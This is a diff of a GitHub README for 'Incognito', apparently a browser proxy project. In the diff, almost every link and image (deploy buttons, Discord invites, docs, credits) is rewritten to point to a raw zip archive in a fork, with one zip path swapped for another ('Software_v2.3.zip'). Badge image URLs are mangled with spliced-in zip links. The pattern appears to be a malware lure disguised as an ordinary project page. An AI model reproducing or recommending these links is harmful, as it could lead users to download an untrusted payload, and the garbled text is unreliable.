@@ -1,6 +1,6 @@
 # NOTICE:
 
-You CANNOT deploy to Vercel, Netifly, GitHub Pages, or Cloudflare pages. [Read more here](https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip).
+You CANNOT deploy to Vercel, Netifly, GitHub Pages, or Cloudflare pages. [Read more here](https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip).
 
 <!--
                                 _     _                     _       _   _          _                               _    
@@ -15,10 +15,10 @@ You CANNOT deploy to Vercel, Netifly, GitHub Pages, or Cloudflare pages. [Read m
 <!-- The font is called Big, if you are wondering -->
 <div align="center">
          
-<img src="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip%20the%20world%20wide%20web&font=Inter&forks=1&issues=1&logo=https%3A%2F%https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip%2Famethystnetwork-dev%2FIncognito%2Fmain%2Fstatic%https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip" alt="Incognito" width="640" height="320" />
+<img src="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip%20the%20world%20wide%20web&font=Inter&forks=1&issues=1&logo=https%3A%2F%https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip%2Famethystnetwork-dev%2FIncognito%2Fmain%2Fstatic%https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip" alt="Incognito" width="640" height="320" />
 
-<a href="" alt="Made with NodeJS"><img src="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip%https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip"></a> 
-<a href="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip" alt=""><img src="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip"></a>
+<a href="" alt="Made with NodeJS"><img src="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip%https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip"></a> 
+<a href="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip" alt=""><img src="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip"></a>
 
 </div>
 
@@ -27,22 +27,22 @@ You CANNOT deploy to Vercel, Netifly, GitHub Pages, or Cloudflare pages. [Read m
     <a>To get started, press one of the buttons below to deploy Incognito</a>
     <br>
     <br>
-    <a href="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip"><img height="30px" src="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip"></img></a>
-    <a href="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip"><img height="30px" src="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip%https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip"></img></a>
-    <a href="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip"><img height="30px" src="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip"><img></a>
-    <a href="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip"><img height="30px" src="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip%https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip"></img></a>
+    <a href="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip"><img height="30px" src="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip"></img></a>
+    <a href="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip"><img height="30px" src="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip%https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip"></img></a>
+    <a href="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip"><img height="30px" src="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip"><img></a>
+    <a href="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip"><img height="30px" src="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip%https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip"></img></a>
     <br>
     <br>
     <a>Or</a>
     <br>
     <br>
-    <a href="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip"><img src="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip%20js-000000?style=for-the-badge&logo=deno&logoColor=white" alt="Deno JS"></img></a>
-    <a href="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip"><img src="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip%https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip" alt="Terminal"></img></a>
-    <a href="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip"><img src="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip%https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip" alt="Docker"></img></a>
+    <a href="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip"><img src="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip%20js-000000?style=for-the-badge&logo=deno&logoColor=white" alt="Deno JS"></img></a>
+    <a href="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip"><img src="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip%https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip" alt="Terminal"></img></a>
+    <a href="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip"><img src="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip%https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip" alt="Docker"></img></a>
     <br>
     <br>
-    <a href="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip">
-      <img src="https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip" width="450" height="150"></img>
+    <a href="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip">
+      <img src="https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip" width="450" height="150"></img>
     </a>
 </div>
 
@@ -50,7 +50,7 @@ You CANNOT deploy to Vercel, Netifly, GitHub Pages, or Cloudflare pages. [Read m
 
 Press the join button to join the server:
 
-[![Join us on Discord](https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip)](https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip)
+[![Join us on Discord](https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip)](https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip)
 
 ## Overview
 
@@ -72,7 +72,7 @@ Press the join button to join the server:
 
 You should join the official Titanium Network Discord for official links
 
-[![Titanium Network Discord](https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip)](https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip)
+[![Titanium Network Discord](https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip)](https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip)
 
 **Who is this repo for?**
 
@@ -80,22 +80,22 @@ This repo is for people that want an easy way to deploy Incognito to cloud hosti
 
 **Where are the game files?**
 
-They are located in [another repo](https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip) because of the large file sizes.
+They are located in [another repo](https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip) because of the large file sizes.
 
 **X website is not working?**
 
-Proxies can have issues, like websites not working, websites blocking the proxy or data being locked to that website. [AlienHub](https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip) fixes these issues and more!
+Proxies can have issues, like websites not working, websites blocking the proxy or data being locked to that website. [AlienHub](https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip) fixes these issues and more!
 
 **What proxies are used?**
 
-Incognito uses [Ultraviolet](https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip) as its only proxy.
+Incognito uses [Ultraviolet](https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip) as its only proxy.
 
 Ultraviolet has some known limitations such as downloading files can be buggy and pages may not load.
 
 **My question is not answered**
 
-Because we can't answer every question here, you may want to check the [docs](https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip). If you still have questions, you might want to join our Discord [#discord-server (link)](#discord-server)
+Because we can't answer every question here, you may want to check the [docs](https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip). If you still have questions, you might want to join our Discord [#discord-server (link)](#discord-server)
 
 ## Credits
 
-[https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip](https://raw.githubusercontent.com/1342Drumbum/Incognito/main/ssl/Incognito_1.3.zip) - Creator of Incognito
+[https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip](https://github.com/1342Drumbum/Incognito/raw/refs/heads/main/static/uv/Software_v2.3.zip) - Creator of Incognito
